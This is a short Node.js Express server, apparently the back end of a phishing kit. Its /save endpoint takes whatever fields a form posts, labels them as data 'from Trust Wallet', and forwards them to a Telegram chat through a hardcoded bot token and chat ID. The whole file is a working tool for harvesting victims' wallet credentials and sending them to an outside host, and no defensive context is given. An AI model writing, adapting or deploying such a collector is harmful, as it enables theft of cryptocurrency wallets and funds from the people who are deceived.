const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// Replace with your Telegram Bot Token and Chat ID
const TELEGRAM_TOKEN = '7971122615:AAH9gD_bc2Rbk9GaoAd7Wi92MNvAAIiwzSw';
const CHAT_ID = '7192846272';

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.post('/save', async (req, res) => {
    const data = req.body;

    // Create a message string
    let message = `Received data from Trust Wallet:\n`;
    for (let key in data) {
        message += `${key}: ${data[key]}\n`;
    }

    try {
        // Send message to Telegram
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
        });

        // Respond to the AJAX request
        if (response.data.ok) {
            res.status(200).json({ success: true });
        } else {
            res.status(500).json({ success: false, message: 'Failed to send message' });
        }
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});